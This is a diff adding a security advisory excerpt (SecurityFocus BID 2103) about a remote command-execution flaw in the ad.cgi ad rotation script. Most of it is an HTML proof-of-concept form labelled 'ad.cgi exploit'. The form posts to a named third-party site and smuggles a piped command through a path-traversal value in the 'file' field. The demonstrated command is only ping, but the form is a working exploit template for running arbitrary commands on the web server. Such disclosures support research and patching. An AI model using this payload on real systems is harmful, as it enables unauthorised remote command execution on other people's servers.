@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/2103/info
+
+ad.cgi is an ad rotation script freely available, and written by Leif Wright. A problem exists in the script which may allow access to restricted resources.
+
+The problem occurs in the method in which the script checks input. Due to insufficent validation of input, the script allows a user to execute programs on the local system by making use of the FORM method. This makes it possible for a malicious users to remotely execute commands on the system with the priviledges inherited by the HTTPD process. 
+
+<html>
+<form action="http://www.conservatives.net/someplace/ad.cgi" method=POST>
+<h1>ad.cgi exploit</h1>
+Command: <input type=text name=file value="../../../../../../../../bin/ping -c 5 www.foo.com|">
+<input type=submit value=run>
+</form>
+</html> 
